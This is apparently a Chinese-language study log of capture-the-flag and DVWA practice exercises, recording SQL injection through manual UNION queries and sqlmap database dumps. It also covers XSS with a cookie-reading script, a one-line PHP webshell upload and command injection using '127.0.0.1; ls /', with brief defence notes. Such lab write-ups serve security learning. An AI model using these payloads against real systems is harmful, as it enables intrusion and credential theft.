### 练习 1：BUU SQL COURSE 1
- **状态**：未解出（仅完成漏洞验证）
- **学到的知识**：
  - 这是一个基于 Vue.js 的前端站点，真实接口隐藏在 `content_detail.php`。
  - 通过 `id=1 AND 1=1` 与 `id=1 AND 1=2` 的对比，确认了 GET 参数存在数字型 SQL 注入。
  - 题解提示 Flag 隐藏在一个叫 virink 的用户密码哈希中。
- **下一步**：学习 SQLMap 工具的使用，或者手写 UNION 注入语句。

### 练习 2：DVWA SQL Injection（Low）实战通关
- **状态**：已完全打通（手工注入）
- **攻击路径**：
  1. **突破**：输入 `1' OR '1'='1` 绕过条件，拉取所有用户。
  2. **探列**：输入 `1' ORDER BY 2 #` 正常，`3 #` 报错，确认只有 2 列。
  3. **回显**：输入 `1' UNION SELECT 'A', 'B' #` 确认回显位置。
  4. **爆库**：`1' UNION SELECT database(), version() #` 得到库名 `dvwa`。
  5. **爆表**：`1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa' #` 得到 `users` 表。
  6. **爆字段**：`1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #` 得到 `user` 和 `password`。
  7. **拿数据**：`1' UNION SELECT user, password FROM users #` 成功获取密码 MD5 哈希！

  ### 练习 4：SQLMap 自动化脱库实战
- **状态**：成功自动化脱库
- **工具**：SQLMap (版本 1.6.4)
- **攻击步骤**：
  1. 获取当前 Cookie（`PHPSESSID=xxx; security=low`）。
  2. 基础探测：`sqlmap -u "目标URL" --cookie="Cookie" --batch`
  3. 获取所有数据库：加上 `--dbs` 参数。
  4. **一键脱库**：`sqlmap -u "目标URL" --cookie="Cookie" --batch -D dvwa --dump`
- **成果**：
  - 识别出漏洞类型：布尔盲注、报错注入、时间盲注、UNION联合查询。
  - 自动识别出后台数据库：MySQL (MariaDB fork)。
  - **成功导出所有用户的账号与明文密码！**

  ### 练习 5：XSS 跨站脚本攻击（Low）
- **状态**：成功复现反射型与存储型 XSS
- **学到的知识**：
  - **反射型 XSS**：通过 `<script>alert('XSS!')</script>` 让网页弹窗，证明输入未过滤。
  - **存储型 XSS**：恶意脚本被存入数据库，所有访问该页面的用户都会中招。
  - **XSS 危害**：使用 `<script>alert(document.cookie)</script>` 可以窃取用户的 SessionID，进而免密登录。
  - **防御思路**：对用户输入进行 HTML 实体编码（如将 `<` 转义为 `&lt;`）。

  ### 练习 6：文件上传漏洞与 WebShell
- **状态**：成功获取服务器命令执行权限
- **学到的知识**：
  - **漏洞原理**：网站未对上传的文件类型进行限制（没有校验后缀名和 MIME 类型）。
  - **WebShell**：上传了 `<?php system($_GET['cmd']); ?>` 一句话木马。
  - **命令执行**：通过 `shell.php?cmd=whoami` 成功执行了服务器系统命令。
  - **防御思路**：白名单校验后缀（只允许 jpg/png 等）、重命名文件、将上传目录设置为不可执行。

  ### 练习 7：CTF² 平台实战首杀（Web-DVWA）
- **状态**：🟢 **已解出 (First Blood!)** 
- **Get Flag**: `CTF{5cd4def-1530-42b6-9280-ef43a48a229f}`
- **攻击路径**：
  1. `127.0.0.1; ls /` 探测目录。
  2. `127.0.0.1; find / -name "*flag*"` 锁定 `/var/www/html/flag.php`。
  3. 浏览器直接访问 `/flag.php` 成功读取。